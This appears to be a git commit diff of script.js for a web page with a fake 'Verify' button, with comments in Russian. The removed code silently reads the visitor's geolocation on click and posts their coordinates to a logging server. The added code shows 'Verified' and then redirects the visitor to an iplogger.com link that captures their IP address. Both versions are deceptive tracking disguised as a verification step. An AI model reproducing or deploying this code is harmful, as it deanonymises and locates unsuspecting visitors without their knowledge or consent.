0b69942a2b6628eb0da5e107e39a30c0ea6fdb2c
onetimerobot <nkbihfbeogae@gmail.com>
2024-08-16 02:59:08 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,46 +1,12 @@
-function verify() {
-    const button = document.getElementById('verifyButton');
-    button.textContent = 'Verified';
-    button.classList.add('verified');
-
-    // Получение геолокации пользователя
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendGeoData, handleError, {timeout: 10000});
-    } else {
-        console.error("Geolocation is not supported by this browser.");
+document.getElementById('verifyButton').addEventListener('click', function() {
+    var button = this;
+    if (button.classList.contains('verified')) {
+        return; // Кнопка уже в состоянии "Verified", ничего не делаем
     }
-}
-
-function sendGeoData(position) {
-    const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        timestamp: new Date().toISOString()
-    };
-
-    console.log('Sending data:', data);
-
-    fetch('http://localhost:3000/log', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data),
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.text();
-    })
-    .then(text => {
-        console.log('Success:', text);
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
-}
-
-function handleError(error) {
-    console.error('Geolocation error:', error.message);
-}
+    button.classList.add('verified');
+    button.textContent = 'Verified';
+    // Перенаправление на указанный URL
+    setTimeout(function() {
+        window.location.href = 'https://iplogger.com/2vKtS6';
+    }, 300); // Задержка 300 мс для плавного перехода
+});
